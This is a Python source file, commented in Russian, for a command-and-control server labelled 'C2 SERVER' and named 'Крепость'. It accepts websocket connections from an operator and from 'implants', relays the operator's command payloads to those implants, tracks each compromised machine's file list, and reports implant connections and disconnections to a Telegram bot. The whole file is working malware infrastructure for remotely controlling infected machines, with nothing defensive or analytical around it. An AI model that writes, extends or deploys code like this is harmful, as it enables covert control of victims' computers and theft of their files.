#
# --- Файл: c2_server.py (Версия 1.0 - Финальная) ---
#
import asyncio, json, os, threading, urllib.parse, urllib.request
from aiohttp import web
import settings

def send_telegram_message(message):
    def send():
        try:
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
            urllib.request.urlopen(url, timeout=10)
        except: pass
    threading.Thread(target=send, daemon=True).start()

IMPLANTS, OPERATOR = {}, None

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse(); await ws.prepare(request)
    client_type, client_id = None, None
    try:
        msg = await ws.receive_json(); client_type = msg.get('type')
        if client_type == 'operator':
            OPERATOR = ws; await broadcast_bot_list()
        elif client_type == 'implant':
            client_id = msg.get('id')
            IMPLANTS[client_id] = {"ws": ws, "files": msg.get('files', {}), "volume": msg.get('current_volume', 50)}
            send_telegram_message(f"✅ Имплант ОНЛАЙН: {client_id}"); await broadcast_bot_list()

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'ping': await ws.send_str('pong'); continue
                data = json.loads(msg.data)
                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id]["ws"].send_str(json.dumps(data['payload']))
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        details = {"files": IMPLANTS[target_id].get("files"), "volume": IMPLANTS[target_id].get("volume")}
                        await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
                elif client_type == 'implant':
                    if data.get('type') == 'file_list_update':
                        IMPLANTS[client_id]["files"] = data.get('files')
                        if OPERATOR: await OPERATOR.send_json({'type': 'bot_details', 'bot_id': client_id, 'data': {"files": data.get('files')}})
            elif msg.type == web.WSMsgType.ERROR: break
    except: pass
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]; send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}"); await broadcast_bot_list()
        elif client_type == 'operator': OPERATOR = None
    return ws

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        await OPERATOR.send_json({'type': 'bot_list', 'data': list(IMPLANTS.keys())})

async def http_handler(request): return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    app = web.Application(); app.router.add_get('/', http_handler); app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app); await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000) # Render требует порт 10000
    await site.start()
    print("====== C2 SERVER (V1.0) ONLINE ======"); send_telegram_message("🚀 Сервер 'Крепость' V1.0 запущен.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try: asyncio.run(main())
    except: send_telegram_message("🛑 Сервер 'Крепость' остановлен.")
